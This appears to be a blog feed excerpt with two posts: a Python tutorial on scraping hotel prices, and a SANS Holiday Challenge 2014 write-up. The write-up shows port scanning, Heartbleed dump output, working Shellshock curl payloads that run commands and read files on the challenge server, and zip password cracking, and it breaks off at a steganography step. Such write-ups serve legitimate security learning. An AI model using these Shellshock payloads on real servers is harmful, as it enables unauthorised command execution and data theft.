    <link href="http://jordan-wright.github.io/blog/2015/02/21/web-scraping-hotel-prices-for-fun-and-savings/"/>
    <updated>2015-02-21T12:05:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2015/02/21/web-scraping-hotel-prices-for-fun-and-savings</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/web_scraping.png"/></p>

<h3>Introduction</h3>

<p>During the process of planning a vacation, I came across a nice hotel I wanted to stay at. When looking at some possible dates, I noticed the nightly rate would fluctuate <em>dramatically</em>. This made me question if I was going to wind up paying way more just because I wanted to stay at the hotel on a certain day.</p>

<p>Then I considered the alternative &ndash; maybe I could scrape the prices every day to find the cheapest nightly rate. Sounded like a job for Python, BeautifulSoup, and some whiskey.</p>

<!--more-->


<h3>A Brief Intro to Python Web Scraping</h3>

<p>Web scraping with Python is generally done using a mixture of the fantastic <code>requests</code> and <code>beautifulsoup</code> libraries. This post won&rsquo;t go into detail about all the neat features of <code>beautifulsoup</code>, instead aiming for simplicity to show the basics.</p>

<h4>Getting a BeautifulSoup Object</h4>

<p>The first step in web scraping is getting the HTML you want, and creating a parseable object out of it. We can do this by requesting a page with <code>requests.get()</code> and, if successful, creating a BeautifulSoup object using the <code>BeautifulSoup()</code> constructor with the <code>.text</code> of our response.</p>

<p>It would look something like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>response = requests.get('http://foo.bar')
</span><span class='line'>if response.ok:
</span><span class='line'>    soup = BeautifulSoup(response.text)</span></code></pre></td></tr></table></div></figure>


<h4>Getting Data From BeautifulSoup</h4>

<p>Now that we have a BeautifulSoup object, we can use its API to get the data we want. The first step is to parse out the <code>Tag</code> object we are interested in. Then, we can parse out the text/attributes we want. Here are some examples of getting specific tags:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>soup.find_all('a') # Get all &lt;a&gt; tags
</span><span class='line'>soup.find_all('a', {"class" : "css_class"}) # Get all &lt;a class="css_class"&gt; tags
</span><span class='line'>soup.find_all('a', 'css_class') # Shortcut for searching by class
</span><span class='line'>soup.find() # Same as find_all(), but returns the first instance</span></code></pre></td></tr></table></div></figure>


<p>After we have the <code>Tag</code> object we want, we can parse out the text by accessing the <code>.text</code> attribute.</p>

<p>This is <em>barely</em> scratching the surface of BeautifulSoup&rsquo;s API, so if you&rsquo;re interested in learning more, you can take a look at the docs <a href="http://www.crummy.com/software/BeautifulSoup/bs4/doc/">here</a>. That&rsquo;s all we&rsquo;ll need for this post, so let&rsquo;s see this in action.</p>

<h3>Parsing Some (Not Great) HTML</h3>

<p>The goal was to simply pull down the rate for each day, and dump it out to a CSV (&ldquo;rates.csv&rdquo;) for some sweet Excel graphing later.</p>

<p>I&rsquo;ll leave the exact hotel and URL redacted, but the basic URL was in the form:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://foo.bar?month=:int&day=:int&year=:int</span></code></pre></td></tr></table></div></figure>


<p>We can start with a naive approach of looping through the months I was interested in (August through December) and getting a BeautifulSoup object from each result.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>import requests
</span><span class='line'>from bs4 import BeautifulSoup
</span><span class='line'>import time
</span><span class='line'>
</span><span class='line'>with open('rates.csv', 'w') as rates:
</span><span class='line'>    rates.write("Date,Rate\n")
</span><span class='line'>    for m in range(8,13):
</span><span class='line'>        for d in range(1,32):
</span><span class='line'>            try:
</span><span class='line'>                response = requests.get('http://foo.bar?month=' + str(m) + '&day=' + str(d) + '&year=2015')
</span><span class='line'>                if response.ok:
</span><span class='line'>                    soup = BeautifulSoup(response.text)
</span><span class='line'>            except Exception e:
</span><span class='line'>                print e
</span><span class='line'>            # Be (somewhat) nice.
</span><span class='line'>            time.sleep(.2)</span></code></pre></td></tr></table></div></figure>


<p>Now we just need to figure out what kind of data we care about. This site used tables. <strong>A lot.</strong> After some testing, I wound up parsing HTML that looked like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;table summary="rooms availability"&gt;
</span><span class='line'>    &lt;tbody&gt;
</span><span class='line'>        &lt;tr&gt;
</span><span class='line'>            &lt;td&gt;
</span><span class='line'>                &lt;div class="roomSection"&gt;
</span><span class='line'>                    &lt;div class="roomType"&gt;
</span><span class='line'>                        &lt;span class="value"&gt;King&lt;/span&gt;
</span><span class='line'>                    &lt;/div&gt;
</span><span class='line'>                    &lt;div class="roomAvail"&gt;
</span><span class='line'>                        &lt;div class="bar"&gt;
</span><span class='line'>                            &lt;div class="label"&gt;Nightly Rate&lt;/div&gt;
</span><span class='line'>                            &lt;div class="value"&gt;
</span><span class='line'>                                159.00 &lt;-- What I want to get
</span><span class='line'>                            &lt;/div&gt;
</span><span class='line'>                        &lt;/div&gt;
</span><span class='line'>                    &lt;/div&gt;
</span><span class='line'>                &lt;/div&gt;
</span><span class='line'>            &lt;/td&gt;
</span><span class='line'>        &lt;/tr&gt;
</span><span class='line'>    &lt;/tbody&gt;
</span><span class='line'>&lt;/table&gt;
</span></code></pre></td></tr></table></div></figure>


<p>I cleaned up the formatting, removed unnecessary parts, etc. Trust me, you&rsquo;re welcome.</p>

<p>My first step was to get the room type and make sure it was &ldquo;King&rdquo; as a sanity check, since there were multiple types of rooms in the table. Then, I wanted to get the text of the div with the class &ldquo;value&rdquo; in the &ldquo;roomAvail&rdquo; section. This is the nightly rate.</p>

<p>Finally, I want to write the rate out to the CSV file.</p>

<p>There&rsquo;s definitely more concise ways of doing this with more advanced BeautifulSoup usage, but this code worked:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>king = soup.find("table", {"summary" : "rooms availability"}).find("div", "roomSection")
</span><span class='line'>if king.find("div", "roomType").text.strip() == "King":
</span><span class='line'>    rate = king.find("div", "roomAvail").find("div", "value").strip()
</span><span class='line'>    rates.write("2015-" + str(m) + "-" + str(d) + "," + str(rate) + "\n")</span></code></pre></td></tr></table></div></figure>


<h3>Success!</h3>

<p>Running the script outputs the results just as I wanted them and, graphed in Excel, looks like this:</p>

<p><img src="http://jordan-wright.github.io/images/blog/web scraping/rates.png"/></p>

<p><em>Awesome.</em> In just a few lines of Python, I was able to get data allowing me to plan a vacation while saving quite a bit of cash.</p>

<p>-Jordan</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SANS Holiday Challenge 2014 - Writeup]]></title>
    <link href="http://jordan-wright.github.io/blog/2015/01/05/sans-holiday-challenge-2014-writeup/"/>
    <updated>2015-01-05T07:15:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2015/01/05/sans-holiday-challenge-2014-writeup</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/sans_holiday_2014.png"/></p>

<h3>Introduction</h3>

<p>Back in December, SANS <a href="pen-testing.sans.org/holiday-challenge/2014">released</a> another installment of their annual holiday challenge. I enjoyed <a href="http://raidersec.blogspot.com/search/label/SANS">taking on the 2012 challenge</a>, so I was excited to see what SANS had in store this year. This year&rsquo;s challenge didn&rsquo;t disappoint with a nice mix of basic network recon, web application hacking, and some forensics. This post will detail how I found each required &ldquo;secret&rdquo; to solve the challenge.</p>

<p><em>I&rsquo;d like to extend a personal thanks for all the hard work SANS puts in to putting on this challenge every year.</em></p>

<!--more-->


<h3>Ghost of Hacking Past</h3>

<p>Let&rsquo;s start with a basic nmap:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~# nmap -v -A -n -Pn -p 1-65535 173.255.233.59
</span><span class='line'>&lt;snip&gt;
</span><span class='line'>Discovered open port 22/tcp on 173.255.233.59
</span><span class='line'>Discovered open port 31124/tcp on 173.255.233.59
</span><span class='line'>&lt;/snip&gt;</span></code></pre></td></tr></table></div></figure>


<p>The SSH service is locked down and doesn&rsquo;t prove fruitful since the only supported authentication method is via public/private keys. However, if we connect to the service on TCP port 31124 using netcat, we find an implementation of the well-known <a href="http://en.wikipedia.org/wiki/ELIZA">ELIZA program</a>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~# nc 173.255.233.59 31124
</span><span class='line'>I AM ELIZA.  WHAT'S ON YOUR MIND?</span></code></pre></td></tr></table></div></figure>


<p>With some trial and error, I found that if we ask for the secret multiple times, we get a hint:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~# nc 173.255.233.59 31124
</span><span class='line'>I AM ELIZA.  WHAT'S ON YOUR MIND?
</span><span class='line'>&gt; secret
</span><span class='line'>A GIRL'S GOTTA KEEP HER SECRETS.  WHY DON'T YOU ASK ME ABOUT SOMETHING ELSE?
</span><span class='line'>&gt; secret
</span><span class='line'>YOU REALLY ARE INTERESTED IN MY SECRET.  I THINK WE SHOULD GET TO KNOW EACH OTHER BETTER FIRST.  TELL ME ABOUT YOUR FAVOURITE WEBSITES.
</span><span class='line'>&gt; secret
</span><span class='line'>I AM SO SORRY, BUT I CAN'T TELL YOU MY SECRET VIA THIS DIALOG.  I DO REALLY LIKE YOU, BUT I WORRY THAT SOMEONE MAY BE SHOULDER SURFING YOU.  NO ONE IS SHOULDER SURFING ME, THOUGH, SO WHY DON'T YOU GIVE ME A URL THAT I CAN SURF TO?</span></code></pre></td></tr></table></div></figure>


<p>Looks like we can make Eliza navigate to a URL of our choosing. Let&rsquo;s setup a netcat listener, and then point Eliza to it to see what she does.</p>

<p>Back on our server, we setup the listener:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~# nc -l -p 80</span></code></pre></td></tr></table></div></figure>


<p>Then, we tell Eliza to visit the host</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&gt; surf to http://x.x.x.x
</span><span class='line'>DOES THIS LOOK LIKE THE CORRECT PAGE?</span></code></pre></td></tr></table></div></figure>


<p>And, back in our netcat session, we see this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET / HTTP/1.1
</span><span class='line'>Accept-Encoding: identity
</span><span class='line'>Host: 107.170.44.35
</span><span class='line'>Connection: close
</span><span class='line'>User-Agent: Mozilla/5.0 (Bombe; Rotors:36) Eliza Secret: "Machines take me by surprise with great frequency. -Alan Turing"</span></code></pre></td></tr></table></div></figure>


<p>Awesome &ndash; one down. Let&rsquo;s move on.</p>

<h3>Ghost of Hacking Present</h3>

<p>SANS is great at incorporating big vulnerabilities found in the previous year into their holiday challenges. As such, I was hoping there would be a mention to Heartbleed and Shellshock somewhere in their challenges. Sure enough, the Ghost of Hacking Present allowed us to leverage both vulnerabilities to our advantage.</p>

<p>Let&rsquo;s start with the HTTPS service.</p>

<p>Running a <a href="link">Heartbleed POC script</a>, we can see the following dumped from the server:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0180: 01 00 0F 00 01 01 43 25 32 30 69 74 73 25 32 30  ......C%20its%20
</span><span class='line'>0190: 66 6F 72 6D 25 32 43 25 32 30 61 6E 64 25 32 30  form%2C%20and%20
</span><span class='line'>01a0: 6C 65 66 74 25 32 30 6E 6F 74 68 69 6E 67 25 32  left%20nothing%2
</span><span class='line'>01b0: 30 6F 66 25 32 30 69 74 25 32 30 76 69 73 69 62  0of%20it%20visib
</span><span class='line'>01c0: 6C 65 25 32 30 73 61 76 65 25 32 30 6F 6E 65 25  le%20save%20one%
</span><span class='line'>01d0: 32 30 6F 75 74 73 74 72 65 74 63 68 65 64 25 32  20outstretched%2
</span><span class='line'>01e0: 30 68 61 6E 64 2E 25 32 30 42 75 74 25 32 30 66  0hand.%20But%20f
</span><span class='line'>01f0: 6F 72 25 32 30 74 68 69 73 25 32 30 69 74 25 32  or%20this%20it%2
</span><span class='line'>0200: 30 77 6F 75 6C 64 25 32 30 68 61 76 65 25 32 30  0would%20have%20
</span><span class='line'>0210: 62 65 65 6E 25 32 30 64 69 66 66 69 63 75 6C 74  been%20difficult
</span><span class='line'>0220: 25 32 30 74 6F 25 32 30 64 65 74 61 63 68 25 32  %20to%20detach%2
</span><span class='line'>0230: 30 69 74 73 25 32 30 66 69 67 75 72 65 25 32 30  0its%20figure%20
</span><span class='line'>0240: 66 72 6F 6D 25 32 30 74 68 65 25 32 30 6E 69 67  from%20the%20nig
</span><span class='line'>0250: 68 74 25 32 43 25 32 30 61 6E 64 25 32 30 73 65  ht%2C%20and%20se
</span><span class='line'>0260: 70 61 72 61 74 65 25 32 30 69 74 25 32 30 66 72  parate%20it%20fr
</span><span class='line'>0270: 6F 6D 25 32 30 74 68 65 25 32 30 64 61 72 6B 6E  om%20the%20darkn
</span><span class='line'>0280: 65 73 73 25 32 30 62 79 25 32 30 77 68 69 63 68  ess%20by%20which
</span><span class='line'>0290: 25 32 30 69 74 25 32 30 77 61 73 25 32 30 73 75  %20it%20was%20su
</span><span class='line'>02a0: 72 72 6F 75 6E 64 65 64 2E 25 32 30 26 57 65 62  rrounded.%20&Web
</span><span class='line'>02b0: 73 69 74 65 25 32 30 53 65 63 72 65 74 25 32 30  site%20Secret%20
</span><span class='line'>02c0: 25 32 33 31 3D 48 61 63 6B 69 6E 67 25 32 30 63  %231=Hacking%20c
</span><span class='line'>02d0: 61 6E 25 32 30 62 65 25 32 30 6E 6F 62 6C 65 25  an%20be%20noble%</span></code></pre></td></tr></table></div></figure>


<p>Decoded, this gives us:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>its form, and left nothing of it visible save one outstretched hand. But for this it would have been difficult to detach its figure from the night, and separate it from the darkness by which it was surrounded.
</span><span class='line'>&Website Secret #1=Hacking can be noble</span></code></pre></td></tr></table></div></figure>


<p>Now let&rsquo;s turn our attention to the main HTTP site. Basic recon shows us that a contact page is available at <code>/cgi-bin/submit.sh</code>. The <code>.sh</code> tells us that this is likely a shell script processing the request. This immediately tells us to check for Shellshock. After a little bit of trial and error, we can get the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~/sans# curl http://www.scrooge-and-marley.com/cgi-bin/submit.sh -A "() { :;};echo;pwd;"
</span><span class='line'>/var/www/cgi-bin
</span><span class='line'>Content-Type: text/html
</span><span class='line'>&lt;html&gt;&lt;head&gt;&lt;style type="text/css"&gt; body { background-color: #E9DD09; } &lt;/style&gt;&lt;META http-equiv="refresh" content="0;URL=http://www.scrooge-and-marley.com/"&gt;&lt;/head&gt;&lt;/html&gt;</span></code></pre></td></tr></table></div></figure>


<p>Great. Now that we can start running commands, let&rsquo;s start exploring the filesystem. We find out pretty quickly that only bash builtin commands are available to us (no <code>cat</code>, <code>ls</code> etc.) &ndash; bummer. No problem, we can start by exploring the filesystem via <code>echo /&lt;directory&gt;*</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~/sans# curl http://www.scrooge-and-marley.com/cgi-bin/submit.sh -A "() { :;};echo; echo /*"
</span><span class='line'>/bin /dev /etc /lib /lib64 /run /sbin /secret /selinux /usr /var</span></code></pre></td></tr></table></div></figure>


<p>Looks like the file is at <code>/secret</code>. We can use a bash read loop to get the contents of it.</p>

<p><em>Note: Make sure to escape the <code>$</code>, otherwise the local system will try to replace the variable contents </em>before* sending the request.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~/sans# curl http://www.scrooge-and-marley.com/cgi-bin/submit.sh -A "() { :;};echo;while read line; do echo \$line; done &lt; /secret;"
</span><span class='line'>Website Secret #2: Use your skills for good.</span></code></pre></td></tr></table></div></figure>


<p>Easy as that!</p>

<p><em>Fun fact: the <code>/server-status</code> page was accessible on the server, allowing us to essentially watch as requests are being made to the server. Big shout-out to everyone trying to brute force hidden files/directories :)</em></p>

<h3>Ghost of Hacking Future</h3>

<p>This one was tougher than the first two &ndash; largely because I&rsquo;m not great at filesystem forensics. To follow along, you can download the file <a href="http://pen-testing.sans.org/hhusb.dd.bin">here</a>.</p>

<p>First, we run <code>file</code> to see what kind of file this is:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~# file hhusb.dd.bin
</span><span class='line'>hhusb.dd.bin: x86 boot sector, code offset 0x52, OEM-ID "NTFS    ", sectors/cluster 8, reserved sectors 0, Media descriptor 0xf8, heads 255, hidden sectors 2048, dos &lt; 4.0 BootSector (0x0)</span></code></pre></td></tr></table></div></figure>


<p>Looks like a standard NTFS filesystem. Let&rsquo;s try to mount the image:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~# mount hhusb.dd.bin /mnt -t ntfs
</span><span class='line'>root@jordan:~# ls /mnt/
</span><span class='line'>hh2014-chat.pcapng  LetterFromJackToChuck.doc</span></code></pre></td></tr></table></div></figure>


<p>Sweet &ndash; we have two files. Opening the .doc doesn&rsquo;t give us much info, but I wonder if there&rsquo;s more to it than meets the eye. I ran <code>strings</code> on the file and found this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>USB Secret #1: Your demise is a source of mirth.</span></code></pre></td></tr></table></div></figure>


<p>Looks like a secret was hidden in the file. Huh. Turns out, this was in one of the document properties, which are viewable using Word.</p>

<p>Now let&rsquo;s go after the PCAP. Looking through the contents of the file, we can see a conversation regarding the death of Scrooge, but no secret. I began to wonder if there was a reason that this was a pcap-<strong>ng</strong> file instead of just a pcap. Turns out, there are additional fields supported by pcap-ng files, one of which is packet comments.</p>

<p>Using Wireshark, we can find any packet comments by filtering for <code>pkt_comment</code>:</p>

<p><img src="http://jordan-wright.github.io/images/blog/sans_2014/pkt_comment.png"/></p>

<p>Sweet! Looks like there are two comments:</p>

<ul>
<li><code>VVNCIFNlY3JldCAjMjogWW91ciBkZW1pc2UgaXMgYSBzb3VyY2Ugb2YgcmVsaWVmLg==</code></li>
<li><a href="https://code.google.com/p/f5-steganography/">https://code.google.com/p/f5-steganography/</a></li>
</ul>


<p>The first one is base64 encoded:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~/sans_recovered# echo VVNCIFNlY3JldCAjMjogWW91ciBkZW1pc2UgaXMgYSBzb3VyY2Ugb2YgcmVsaWVmLg== | base64 -d
</span><span class='line'>USB Secret #2: Your demise is a source of relief.</span></code></pre></td></tr></table></div></figure>


<p>The other hint might come in handy later. Ok, two secrets down. But where&rsquo;s #3 and #4? I bet there are more files to be had. Let&rsquo;s use The Sleuth Kit to check for previously deleted files that we can recover:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:/mnt# fls ~/hhusb.dd.bin -u
</span><span class='line'>r/r 4-128-4:    $AttrDef
</span><span class='line'>r/r 8-128-2:    $BadClus
</span><span class='line'>r/r 8-128-1:    $BadClus:$Bad
</span><span class='line'>r/r 6-128-4:    $Bitmap
</span><span class='line'>r/r 7-128-1:    $Boot
</span><span class='line'>d/d 11-144-4:   $Extend
</span><span class='line'>r/r 2-128-1:    $LogFile
</span><span class='line'>r/r 0-128-1:    $MFT
</span><span class='line'>r/r 1-128-1:    $MFTMirr
</span><span class='line'>r/r 9-128-8:    $Secure:$SDS
</span><span class='line'>r/r 9-144-6:    $Secure:$SDH
</span><span class='line'>r/r 9-144-5:    $Secure:$SII
</span><span class='line'>r/r 10-128-1:   $UpCase
</span><span class='line'>r/r 3-128-3:    $Volume
</span><span class='line'>r/r 32-128-1:   hh2014-chat.pcapng
</span><span class='line'>r/r 32-128-5:   hh2014-chat.pcapng:Bed_Curtains.zip
</span><span class='line'>r/r 33-128-1:   LetterFromJackToChuck.doc
</span><span class='line'>-/r * 34-128-1: Tiny_Tom_Crutches_Final.jpg
</span><span class='line'>d/d 256:        $OrphanFiles</span></code></pre></td></tr></table></div></figure>


<p>I see a couple of things that stand out. First off, what&rsquo;s that &ldquo;Bed_Curtains.zip&rdquo; file? Also, it looks like a file called &ldquo;Tiny_Tom_Crutches_Final.jpg&rdquo; was previously deleted (indicated by the <code>*</code>). Let&rsquo;s go ahead and extract all these files into a directory called <code>/sans_recovered</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~# mkdir sans_recovered
</span><span class='line'>root@jordan:~# tsk_recover -e -f ntfs ./hhusb.dd.bin ./sans_recovered/
</span><span class='line'>Files Recovered: 4
</span><span class='line'>root@jordan:~# cd sans_recovered/
</span><span class='line'>root@jordan:~/sans_recovered# ls
</span><span class='line'>$Extend  hh2014-chat.pcapng  LetterFromJackToChuck.doc  Tiny_Tom_Crutches_Final.jpg</span></code></pre></td></tr></table></div></figure>


<p>Where&rsquo;s &ldquo;Bed_Curtains.zip&rdquo;? After asking around, it turns out that this syntax indicates the file is stored as an NTFS alternate data stream. We can extract the file manually using <code>icat</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~# icat hhusb.dd.bin 32-128-5 &gt; sans_recovered/Bed_Curtains.zip</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s unzip it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~/sans_recovered# unzip Bed_Curtains.zip
</span><span class='line'>Archive:  Bed_Curtains.zip
</span><span class='line'>[Bed_Curtains.zip] Bed_Curtains.png password:</span></code></pre></td></tr></table></div></figure>


<p>Looks like it&rsquo;s password protected, so what password should we use? At this point, we notice the following hint given by the SANS storyline:</p>

<blockquote><p>Just work with me on this, man. There&rsquo;s something important and even CeWL here for you.</p></blockquote>

<p>This suggests that the tool <a href="http://digi.ninja/projects/cewl.php"><code>CeWL</code></a> would be useful in creating a custom wordlist to break the password. We can run the tool like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./cewl.rb -d 3 -w sans_wordlist.txt http://pen-testing.sans.org/holiday-challenge/2014</span></code></pre></td></tr></table></div></figure>


<p>Unfortunately, after trying this as a wordlist for both the SANS URL as well as directly with hackersforcharity.org, I still couldn&rsquo;t find the right password. So, next choice &ndash; just use a huge wordlist. We&rsquo;ll crack the password using John the Ripper (ver: 1.7.9-jumbo-7).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~# zip2john sans_recovered/Bed_Curtains.zip &gt; sans_recovered/Bed_Curtains.john
</span><span class='line'>root@jordan:~# john --wordlist=wordlists/all  --rules Bed_Curtains.john
</span><span class='line'>&lt;snip&gt;
</span><span class='line'>root@jordan:~/sans_recovered# john --show Bed_Curtains.john
</span><span class='line'>/root/sans_recovered/Bed_Curtains.zip:shambolic
</span><span class='line'>root@jordan:~/sans_recovered# unzip Bed_Curtains.zip
</span><span class='line'>Archive:  Bed_Curtains.zip
</span><span class='line'>[Bed_Curtains.zip] Bed_Curtains.png password:
</span><span class='line'>inflating: Bed_Curtains.png</span></code></pre></td></tr></table></div></figure>


<p>Looks like it worked! Let&rsquo;s take a look at the properties of the extracted image using <code>exiftool</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~# exiftool Bed_Curtains.png
</span><span class='line'>File Name                       : Bed_Curtains.png
</span><span class='line'>Directory                       : .
</span><span class='line'>File Size                       : 1401 kB
</span><span class='line'>&lt;snip&gt;
</span><span class='line'>Comment                         : USB Secret #3: Your demise is a source of gain for others.
</span><span class='line'>Exif Byte Order                 : Big-endian (Motorola, MM)
</span><span class='line'>&lt;snip&gt;</span></code></pre></td></tr></table></div></figure>


<p>One more to go. Let&rsquo;s look at the Tiny_Tom_crutches.png file to see what we can find. With this being a CTF style challenge, let&rsquo;s check for the presence of steganography. The tool <code>stegdetect</code> is pretty good at this, so let&rsquo;s see what it finds:</p>

